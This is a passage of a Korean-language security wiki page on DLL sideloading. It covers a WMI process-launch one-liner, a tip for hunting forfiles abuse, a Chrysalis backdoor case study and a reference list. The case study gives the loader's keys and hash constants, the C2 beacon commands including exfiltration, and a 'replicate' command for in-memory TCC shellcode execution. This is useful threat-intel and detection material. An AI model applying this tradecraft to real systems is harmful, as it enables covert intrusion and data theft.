- **WMI/CIM launch:** WMI를 통해 EXE를 시작하면 원격 텔레메트리는 CIM이 생성한 프로세스로 표시되는 동안 콜로케이트된 DLL을 로드합니다:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- `intelbq.exe`, `nearby_share.exe` 등 로컬 DLL을 우선하는 바이너리와 작동하며; 페이로드(예: Remcos)는 신뢰된 이름 아래에서 실행됩니다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 등장할 때 `forfiles`에 경보를 설정하세요; 관리 스크립트 외부에서는 드뭅니다.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침입은 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 전달했고, 이는 DLL sideload와 완전히 인메모리 페이로드를 단계적으로 배치했습니다.

Tradecraft flow
- `update.exe` (NSIS)가 `%AppData%\Bluetooth`를 생성하고 **HIDDEN** 속성으로 표시한 뒤, 이름을 바꾼 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 그리고 암호화된 블롭 `BluetoothService`를 드롭하고 EXE를 실행합니다.
- 호스트 EXE는 `log.dll`을 임포트하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`은 블롭을 mmap으로 로드하고; `LogWrite`는 커스텀 LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 키 재료는 이전 해시에서 유도)을 사용해 복호화하여 버퍼를 평문 쉘코드로 덮어쓰고, 임시값을 해제한 뒤 그 위치로 점프합니다.
- IAT를 피하기 위해 로더는 내보낸 이름을 해싱해 API를 해결합니다: **FNV-1a basis 0x811C9DC5 + prime 0x1000193**로 해싱한 뒤 Murmur 스타일의 avalanche(**0x85EBCA6B**)를 적용하고 솔트된 목표 해시와 비교합니다.

Main shellcode (Chrysalis)
- 메인 모듈을 PE 유사 형태로 복호화하는데 키 `gQ2JR&9;`로 다섯 번 반복되는 add/XOR/sub를 수행한 후, 동적으로 `Kernel32.dll` → `GetProcAddress`를 로드해 임포트 해결을 마칩니다.
- DLL 이름 문자열은 런타임에 문자별 비트 회전/ XOR 변환으로 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드합니다.
- 두 번째 리졸버는 **PEB → InMemoryOrderModuleList**를 스캔하고 각 내보내기 테이블을 4바이트 블록으로 Murmur 스타일 혼합을 적용해 파싱하며, 해시가 발견되지 않으면 `GetProcAddress`로 폴백합니다.

Embedded configuration & C2
- 구성은 드롭된 `BluetoothService` 파일의 **offset 0x30808**(크기 **0x980**)에 위치하며 키 `qwhvb^435h&*7`로 RC4 복호화되어 C2 URL과 User-Agent를 드러냅니다.
- 비콘은 도트로 구분된 호스트 프로파일을 구성하고 접두사 태그 `4Q`를 붙인 뒤 키 `vAuig34%^325hGV`로 RC4 암호화하여 HTTPS로 `HttpSendRequestA`합니다. 응답은 RC4로 복호화되어 태그 스위치로 분기됩니다(`4T` 셸, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 언인스톨, `4` 드라이브/파일 열거 및 청크 전송 케이스).
- 실행 모드는 CLI 인수로 제어됩니다: 인수가 없으면 설치(persistence: 서비스/Run 키)를 수행하며 `-i`를 가리킵니다; `-i`는 스스로를 `-k`로 재실행하고; `-k`는 설치를 건너뛰고 페이로드를 실행합니다.

Alternate loader observed
- 동일 침입에서는 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, `libtcc.dll`이 옆에 있었습니다. 공격자가 제공한 C 소스는 쉘코드를 포함하고 컴파일되어 디스크에 PE를 남기지 않고 인메모리로 실행되었습니다. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반의 compile-and-run 단계는 런타임에 `Wininet.dll`을 임포트하고 하드코드된 URL에서 second-stage shellcode를 가져와, compiler run으로 위장하는 유연한 loader를 제공했다.

## 참고자료

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
